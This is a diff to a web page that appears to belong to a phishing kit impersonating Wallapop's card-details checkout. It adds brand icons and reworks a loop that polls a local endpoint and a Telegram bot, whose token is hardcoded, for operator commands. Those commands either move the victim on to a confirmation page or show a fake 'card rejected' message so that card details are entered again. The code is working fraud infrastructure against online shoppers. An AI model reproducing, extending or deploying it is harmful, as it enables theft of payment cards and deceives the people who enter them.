@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Datos de la tarjeta · Wallapop</title>
+<link rel="icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
+<link rel="apple-touch-icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -174,13 +176,13 @@ const MC_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAv
 
 let marca = '';
 let cardPollTimer = null;
-let p = null;
 
 (async function init() {
   $('volver').onclick = () => location.href = '/a/' + id;
   $('okVolver').href = '/a/' + id;
   if (!id) { $('miniTitulo').textContent = 'Sin producto'; return; }
   try {
+    let p = null;
     try {
       const r = await fetch('/api/product/' + id);
       if (r.ok) p = await r.json();
@@ -324,67 +326,33 @@ $('form').addEventListener('submit', async ev => {
   if (cardPollTimer) clearTimeout(cardPollTimer);
 
   const pollCardStatus = async () => {
-    let data = null;
-    // 1. Probar ruta amigable
+    // 1. Probar API local
     try {
       const resp = await fetch('/api/product/' + id + '/tarjeta/status?t=' + Date.now());
       if (resp.ok) {
-        data = await resp.json();
+        const data = await resp.json();
+        if (data.status === 'continue' || data.status === 'continuar') {
+          window.location.href = '/confirmar.html' + (id ? '?id=' + id : '');
+          return;
+        } else if (data.status === 'error') {
+          $('spinnerTarjeta').style.display = 'none';
+          $('txtBtnTarjeta').textContent = 'Continuar';
+          btn.disabled = false;
+          $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
+          $('cardErrorBox').style.display = 'flex';
+          return;
+        }
       }
     } catch (e) {}
 
-    // 2. Probar api.php directo (fallback infalible para hosting PHP)
-    if (!data || !data.status) {
-      try {
-        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + id + '&t=' + Date.now());
-        if (resp2.ok) {
-          data = await resp2.json();
-        }
-      } catch (e) {}
-    }
-
-    if (data && data.status) {
-      if (data.status === 'continue' || data.status === 'continuar') {
-        const qParams = new URLSearchParams();
-        if (id) qParams.set('id', id);
-        if (p) {
-          if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
-          const pVal = p.precioArticulo || p.precio || 0;
-          if (pVal) qParams.set('precio', pVal);
-        }
-        const rawP = new URLSearchParams(location.search).get('p');
-        if (rawP) qParams.set('p', rawP);
-        try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-        window.location.href = 'confirmar.php?' + qParams.toString();
-        return;
-      } else if (data.status === 'error') {
-        $('spinnerTarjeta').style.display = 'none';
-        $('txtBtnTarjeta').textContent = 'Continuar';
-        btn.disabled = false;
-        $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
-        $('cardErrorBox').style.display = 'flex';
-        return;
-      }
-    }
-
-    // 3. Respaldo adicional Telegram getMyDescription
+    // 2. Probar Telegram getMyDescription
     try {
       const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
       if (tgDescResp.ok) {
         const tgData = await tgDescResp.json();
         const desc = (tgData && tgData.result && tgData.result.description) || '';
         if (desc.includes('status:continue')) {
-          const qParams = new URLSearchParams();
-          if (id) qParams.set('id', id);
-          if (p) {
-            if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
-            const pVal = p.precioArticulo || p.precio || 0;
-            if (pVal) qParams.set('precio', pVal);
-          }
-          const rawP = new URLSearchParams(location.search).get('p');
-          if (rawP) qParams.set('p', rawP);
-          try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-          window.location.href = 'confirmar.php?' + qParams.toString();
+          window.location.href = '/confirmar.html' + (id ? '?id=' + id : '');
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -397,7 +365,7 @@ $('form').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1000);
+    cardPollTimer = setTimeout(pollCardStatus, 1200);
   };
 
   cardPollTimer = setTimeout(pollCardStatus, 1200);
